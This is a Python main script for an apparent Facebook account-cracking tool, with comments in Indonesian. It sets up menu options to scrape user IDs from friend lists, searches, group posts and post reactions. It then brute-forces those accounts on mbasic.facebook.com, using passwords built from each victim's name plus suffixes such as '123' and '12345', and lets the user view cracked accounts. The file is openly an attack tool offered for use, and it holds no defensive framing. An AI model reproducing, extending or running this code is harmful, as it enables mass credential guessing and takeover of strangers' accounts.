#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : app.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

from src.store import Store
from src.MBF import MBF
from src.http import Http
from src.data.login import Login
from src.data.dump import Dump
from src.data.brute import Brute

store = Store()

#######################################################
#                   C O N F I G                       #
#######################################################
# akan menghasilkan pw: nama_depan123, nama_belakang12345
# nama_tengah123, nama_tengah12345
# dan seterusnya
store.passwordNameList = ['123', '12345']
# contoh penggunaan store.passwordExtraList = ['sayang', 'doraemon', 'dll']
# catatan: semakin banyak password semakin lama proses crakingnya.
store.passwordExtraList = []
# lower password
store.passwordLower = True
# base url
store.setBaseURL('https://mbasic.facebook.com{0}')
# login class
store.setLoginClass(Login)
# http requests classs
store.setHttpClass(Http)

dump = Dump(store)
mbf = MBF(store)
brute = Brute(store)

store.add({
    'name': 'Start crack',
    'func': brute.main,
})
store.add({
    'name': 'Dump id dari daftar teman',
    'func': dump.friendsList,
})
store.add({
    'name': 'Dump id publik',
    'func': dump.publicID,
})
store.add({
    'name': 'Dump id dari pencarian nama',
    'func': dump.search,
})
store.add({
    'name': 'Dump id dari reaction post',
    'func': dump.react,
})
store.add({
    'name': 'Dump id dari postingan group',
    'func': dump.postGroup,
})
store.add({
    'name': 'Hapus cache hasil dump',
    'func': mbf.clearDumpCache,
})
store.add({
    'name': 'Lihat hasil crack',
    'func': mbf.resultCrack,
})
store.add({
    'name': 'Ganti akun',
    'func': mbf.changeAccount,
})

mbf.run()